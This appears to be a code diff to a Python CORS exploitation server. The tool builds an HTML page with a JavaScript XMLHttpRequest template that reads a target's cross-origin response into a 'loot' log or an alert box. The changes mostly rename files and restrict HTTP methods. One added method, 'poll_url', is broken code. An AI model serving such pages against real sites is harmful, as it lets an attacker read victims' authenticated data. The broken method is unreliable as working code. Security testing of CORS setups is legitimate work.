@@ -7,6 +7,7 @@ Cross-Origin Resource Exploitation Server
 import argparse
 import json
 import os
+import requests
 import signal
 import socket
 import urllib
@@ -35,7 +36,7 @@ class Cores(object):
         self.verbose = verbose
         self.internal_ip = None
         self.external_ip = None
-        self.html_name = 'cores.html'
+        self.html_name = 'index.html'
         self.http_server_pid = None
         self.autolaunch_browser = autolaunch_browser
 
@@ -51,6 +52,9 @@ class Cores(object):
             return self.external_ip["ip"]
         except IOError:
             print(red('!')+ 'Check your Internet connection')
+
+    def poll_url(self):
+        response = requests.self.method
 
     def get_internal_address(self):
         """use socket to try to connect to 8.8.8.8 on tcp/53, return getsockname as internal_ip"""
@@ -76,7 +80,7 @@ class Cores(object):
             2. Write CORS template to file '''
 
         if self.log_style.lower() == 'html':
-            filename = './js/cores.js'
+            filename = './js/cors.js'
             cors_js_template = """var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('{0}','{1}',true);
@@ -87,7 +91,7 @@ function reqListener() {{
 }};"""
 
         if self.log_style.lower() == 'alert':
-            filename = './js/cores.js'
+            filename = './js/cors.js'
             cors_js_template = """var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('{0}','{1}',true);
@@ -125,7 +129,7 @@ window.alert(this.responseText);
                 <p style="margin-left: 55px">
                 <b>Logs:</b></p>
                 <p style="margin-left: 55px", id="loot"></p>
-                    <script src="js/cors.js"></script>
+                    <script src="/js/cors.js"></script>
             </body>
         </html>"""
         html_index_page = html_template.format(self.Version, self.Contributors)
@@ -189,8 +193,9 @@ def main():
 
     parser = argparse.ArgumentParser()
     parser.add_argument('-m', '--method', \
-        metavar='GET, POST, etc.', \
-        help='Define HTTP request method [GET, HEAD, POST] ex: -m POST', \
+        metavar='get, post, etc.', \
+        help='Define HTTP request method ex: -m post', \
+        choices=['get', 'post', 'put', 'delete', 'head', 'trace'], \
         required=True)
     parser.add_argument('-p', '--port', \
         metavar='8080',\
@@ -223,6 +228,7 @@ def main():
     runcores.dir_check()
     runcores.get_external_address()
     runcores.get_internal_address()
+    runcores.poll_url()
     runcores.cors_js_template()
     runcores.html_template()
 
